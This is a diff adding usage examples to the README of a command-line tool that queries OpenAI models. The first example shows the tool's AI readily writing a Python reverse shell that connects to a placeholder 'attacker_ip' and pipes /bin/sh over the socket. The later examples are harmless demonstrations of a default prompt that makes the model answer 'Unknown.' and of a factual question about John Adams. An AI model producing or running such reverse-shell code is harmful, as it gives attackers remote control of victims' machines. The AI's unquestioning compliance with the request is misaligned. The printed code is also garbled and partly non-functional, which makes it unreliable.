@@ -43,3 +43,48 @@ cd gpt-cli
 python3 -m pip install -r requirements.txt
 ```
 
+### Examples:
+
+```
+╭─phx@bigboi ~/git/gpt-cli  ‹master*› 
+╰─➤  gpt 'Write python script to create reverse shell.'
+Prompt:
+Write python script to create reverse shell.
+
+Answer:
+import socket
+import subprocess# Create a socket
+s = socket.socket()# Connect to the attacker machine
+s.connect(("attacker_ip", attacker_port))# Create a subprocess to execute a shell
+proc = subprocess.Popen(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno())# Keep the connection alive
+while True:
+    data = s.recv(1024)
+    if data == "exit":
+        break
+    proc.stdin.write(data)
+    proc.stdout.flush()# Close the connection
+s.close()
+----------------------------------------------------------------------
+```
+
+```
+╭─phx@bigboi ~/git/gpt-cli  ‹master*› 
+╰─➤  OPENAI_DEFAULT_PROMPT='Do not give nonsense answers. If you do not know that your answer is factual, respond with "Unknown. "' gpt 'Who is Gregory Washingheimer Van Fleet?'
+Prompt:
+Who is Gregory Washingheimer Van Fleet?
+
+Answer:
+Unknown.
+----------------------------------------------------------------------
+╭─phx@bigboi ~/git/gpt-cli  ‹master*› 
+╰─➤  OPENAI_DEFAULT_PROMPT='Do not give nonsense answers. If you do not know that your answer is factual, respond with "Unknown. "' gpt 'Who is John Adams?'                     
+Prompt:
+Who is John Adams?
+
+Answer:
+John Adams was the second President of the United States, serving from 1797 to 1801.
+----------------------------------------------------------------------
+```
+
+
+
